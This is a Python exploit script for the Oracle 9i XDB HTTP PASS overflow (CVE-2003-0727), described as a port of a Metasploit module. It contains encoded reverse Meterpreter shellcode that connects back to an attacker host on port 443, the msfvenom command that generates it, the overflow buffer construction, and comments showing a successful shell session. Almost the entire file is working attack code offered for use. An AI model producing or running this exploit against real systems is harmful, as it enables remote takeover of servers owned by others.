#!/usr/bin/python

# This exploit has been ported to python from the Metasploit Module located here:
# https://www.exploit-db.com/exploits/16809/ 
# CVE-2003-0727




import sys
from socket import *
import base64




# root@kali:~/exploits# python XDB9i-PASS.py 192.168.1.5 8080

# [*]Evil buffer created

# [*]Sending Evil buffer to: 192.168.1.5 on port: 8080..

# [*]Evil buffer sent. G0t Sh3ll?

# root@kali:~/exploits#



# An MSF handler should receive a connect back shell on port 443 in another shell

# msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
# payload => windows/meterpreter/reverse_tcp
# msf exploit(handler) > set LHOST 192.168.1.1
# LHOST => 192.168.1.1
# msf exploit(handler) > set LPORT 443
# LPORT => 443
# msf exploit(handler) > exploit

# [*] Started reverse TCP handler on 192.168.1.1:443 
# [*] Starting the payload handler...
# [*] Sending stage (957999 bytes) to 192.168.1.5
# [*] Meterpreter session 1 opened (192.168.1.1:443 -> 192.168.1.5:1073) at 2017-02-15 00:28:16 +0000

# meterpreter > 







def usage():
           print("===============================================================================\n")
           print("\t[*]Oracle 9i XDB (Windows x86/w32) - HTTP PASS Overflow Exploit[*]\n")
           print("\t[*]Spawns a reverse meterpreter shell :>[*]\n")
           print("\t[*]By N4ss4r[*]\n")
           print("\t[*]Usage: [host] [port][*]\n")
           print("\t[*]" +sys.argv[0] + " 127.0.0.1 8080[*]\n")
           print("===============================================================================\n")


if len(sys.argv) < 2:
 usage()
 sys.exit()

host = sys.argv[1]
port = sys.argv[2]


# Shellcode creation as below. Replace IP and PORT with your own. This shellcode will not connect back to you unless replaced.
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -a x86 --platform Windows  -b "\x00" -f python -e x86/call4_dword_xor
# connect back shellcode will connect back to you on port 443 inside msf handler.
# x86/call4_dword_xor chosen with final size 380

buf = "\x31\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x6e\xb9\xc8\xed\x83\xee\xfc\xe2\xf4\x92\x51"
buf += "\x4a\xed\x6e\xb9\xa8\x64\x8b\x88\x08\x89\xe5\xe9\xf8"
buf += "\x66\x3c\xb5\x43\xbf\x7a\x32\xba\xc5\x61\x0e\x82\xcb"
buf += "\x5f\x46\x64\xd1\x0f\xc5\xca\xc1\x4e\x78\x07\xe0\x6f"
buf += "\x7e\x2a\x1f\x3c\xee\x43\xbf\x7e\x32\x82\xd1\xe5\xf5"
buf += "\xd9\x95\x8d\xf1\xc9\x3c\x3f\x32\x91\xcd\x6f\x6a\x43"
buf += "\xa4\x76\x5a\xf2\xa4\xe5\x8d\x43\xec\xb8\x88\x37\x41"
buf += "\xaf\x76\xc5\xec\xa9\x81\x28\x98\x98\xba\xb5\x15\x55"
buf += "\xc4\xec\x98\x8a\xe1\x43\xb5\x4a\xb8\x1b\x8b\xe5\xb5"
buf += "\x83\x66\x36\xa5\xc9\x3e\xe5\xbd\x43\xec\xbe\x30\x8c"
buf += "\xc9\x4a\xe2\x93\x8c\x37\xe3\x99\x12\x8e\xe6\x97\xb7"
buf += "\xe5\xab\x23\x60\x33\xd1\xfb\xdf\x6e\xb9\xa0\x9a\x1d"
buf += "\x8b\x97\xb9\x06\xf5\xbf\xcb\x69\x46\x1d\x55\xfe\xb8"
buf += "\xc8\xed\x47\x7d\x9c\xbd\x06\x90\x48\x86\x6e\x46\x1d"
buf += "\x87\x6b\xd1\xc2\xe6\x6e\xce\xa0\xef\x6e\xb8\x73\x64"
buf += "\x88\xe9\x98\xbd\x3e\xf9\x98\xad\x3e\xd1\x22\xe2\xb1"
buf += "\x59\x37\x38\xf9\xd3\xd8\xbb\x39\xd1\x51\x48\x1a\xd8"
buf += "\x37\x38\xeb\x79\xbc\xe7\x91\xf7\xc0\x98\x82\x51\xa9"
buf += "\xed\x6e\xb9\xa2\xed\x04\xbd\x9e\xba\x06\xbb\x11\x25"
buf += "\x31\x46\x1d\x6e\x96\xb9\xb6\xdb\xe5\x8f\xa2\xad\x06"
buf += "\xb9\xd8\xed\x6e\xef\xa2\xed\x06\xe1\x6c\xbe\x8b\x46"
buf += "\x1d\x7e\x3d\xd3\xc8\xbb\x3d\xee\xa0\xef\xb7\x71\x97"
buf += "\x12\xbb\x3a\x30\xed\x13\x9b\x90\x85\x6e\xf9\xc8\xed"
buf += "\x04\xb9\x98\x85\x65\x96\xc7\xdd\x91\x6c\x9f\x85\x1b"
buf += "\xd7\x85\x8c\x91\x6c\x96\xb3\x91\xb5\xec\x04\x1f\x46"
buf += "\x37\x12\x6f\x7a\xe1\x2b\x1b\x7e\x0b\x56\x8e\xa4\xe2"
buf += "\xe7\x06\x1f\x5d\x50\xf3\x46\x1d\xd1\x68\xc5\xc2\x6d"
buf += "\x95\x59\xbd\xe8\xd5\xfe\xdb\x9f\x01\xd3\xc8\xbe\x91"
buf += "\x6c\xc8\xed"




ret = "\x46\x6d\x61\x60"     #0x60616d46 - Universal Windows Return Address
prepend = "\x81\xc4\xff\xef\xff\xff\x44"   #Prepend encoder. This is placed just after the last nop slide and before the shellcode

text = "A" * 4
text2 = "B" * 442
nops = "\x90"

# Building the evil over flow string here.
evil = text +":" + text2 + "\xeb\x64" + nops * 2 + ret + nops * 266 + "\xeb\x10"+  nops * 109 + prepend + buf

evilencoded = base64.b64encode(evil)  #According to metasploit the evil string needs to be encoded with base64


# Building the HTTP request below with the evil string base64 encoded
evilrequest = "Authorization: Basic " + evilencoded + "\r\n\r\n"
evilrequest2 = "GET / HTTP/1.1\r\n" + "Host: " + host +":"+port + "\r\n"+evilrequest

# Print output
print("\n[*]Evil buffer created\n")
print("[*]Sending Evil buffer to: " + str(host) + " on port: " + port + "..\n")



# Create a TCP socket , send evilrequest
s = socket(AF_INET,SOCK_STREAM)
s.connect((host,int(port)))
s.send(evilrequest2)
print("[*]Evil buffer sent. G0t Sh3ll?\n")
s.close


